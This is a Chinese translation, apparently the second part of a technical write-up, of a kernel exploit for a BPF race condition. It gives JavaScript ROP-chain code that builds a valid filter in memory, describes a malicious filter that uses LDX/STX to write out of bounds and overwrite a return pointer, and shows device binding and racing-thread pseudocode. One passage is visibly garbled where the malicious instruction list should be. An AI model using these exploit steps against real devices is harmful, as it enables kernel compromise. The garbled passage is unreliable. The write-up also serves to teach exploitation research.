原文：
在本文的上篇中，我们介绍了竞争条件的概念，以及数据包过滤程序的相关知识。同时，还介绍了引发竞争条件方法，以及如何替换经过验证的数据的准备知识，在本文中，我们将为读者进一步介绍利用该内核漏洞的详细方法。
**设置一个有效的程序**
* * *
首先，我们需要设置一个bpf_program对象，以便可以通过将其传递给ioctl()来设置一个过滤程序。bpf_program的结构如下所示：
    struct bpf_program {                // Size: 0x10
        u_int bf_len;                   // 0x00
        struct bpf_insn *bf_insns;      // 0x08
    };
请注意，bf_len保存的不是以字节为单位的程序指令大小，而是长度。这意味着，我们为bf_len指定的值，等于指令在内存中的总大小除以指令的大小，即8。
    struct bpf_insn {                   // Size: 0x08
        u_short         code;           // 0x00
        u_char          jt;             // 0x02
        u_char          jf;             // 0x03
        bpf_u_int32     k;              // 0x04
    };
其实，有效的程序很容易编写，例如，可以先写一串NOP（无操作）伪指令，然后，在最后面加上一个“return”伪指令即可。通过查看bpf.h，我们就会发现，NOP和RET的操作码分别为0x00和0x06。
    #define         BPF_LD          0x00 // By specifying 0's for the args it effectively does nothing
    #define         BPF_RET         0x06
下面是取自通过JS ROP链实现的漏洞利用代码中的片段，用于在内存中设置一个有效的BPF程序：
**// Setup valid program  
var bpf_valid_prog = malloc(0x10);  
var bpf_valid_instructions = malloc(0x80);
p.write8(bpf_valid_instructions.add32(0x00), 0x00000000);  
p.write8(bpf_valid_instructions.add32(0x08), 0x00000000);  
p.write8(bpf_valid_instructions.add32(0x10), 0x00000000);  
p.write8(bpf_valid_instructions.add32(0x18), 0x00000000);  
p.write8(bpf_valid_instructions.add32(0x20), 0x00000000);  
p.write8(bpf_valid_instructions.add32(0x28), 0x00000000);  
p.write8(bpf_valid_instructions.add32(0x30), 0x00000000);  
p.write8(bpf_valid_instructions.add32(0x38), 0x00000000);  
p.write4(bpf_valid_instructions.add32(0x40), 0x00000006);  
p.write4(bpf_valid_instructions.add32(0x44), 0x00000000);
p.write8(bpf_valid_prog.add32(0x00), 0x00000009);  
p.write8(bpf_valid_prog.add32(0x08), bpf_valid_instructions);**
* * *
**设置一个无效的程序**
* * *
这个程序是我们的恶意代码的老窝，通过write()执行时，它会破坏栈上的内存。这个程序几乎与前面的有效程序一样简单，因为它只包含9个伪指令。我们可以滥用“LDX”和“STX”指令向堆栈中写入数据，为此，首先将我们要加载的值（32位）加载到索引寄存器中，然后将索引寄存器的值存储到临时内存的索引中，但是由于指令无效，所以实际上会写出界外，从而破坏函数的返回指针。以下简单介绍一下要在恶意过滤程序中运行的指令：
    LDX X >> 0)) {
        p.syscall("sys_ioctl", fd1, 0x8020426C, stringify("wlan0"));
        if (p.syscall("sys_write", fd1, spadp, 40).low == (-1 >>> 0)) {
            throw "Failed to bind to first /dev/bpf device!";
        }
    }
然后对第二个设备重复相同的过程。
**设置并行的过滤程序**
* * *
为了引发内存破坏行为，我们需要让两个并行运行的线程在各自的设备上不断设置过滤程序。最终，有效的过滤程序的内存将被free()函数所释放并重新分配，直至被无效过滤程序所破坏。为此，各个线程需要执行以下操作（伪代码）：
**// 0x8010427B = BIOCSETWF  
void threadOne() // Sets a valid program  
{  
for(;;)  
{  
ioctl(fd1, 0x8010427B, bpf_valid_program);  
}  
}
void threadTwo() // Sets an invalid program  
{  
for(;;)  
{  
ioctl(fd2, 0x8010427B, bpf_invalid_program);  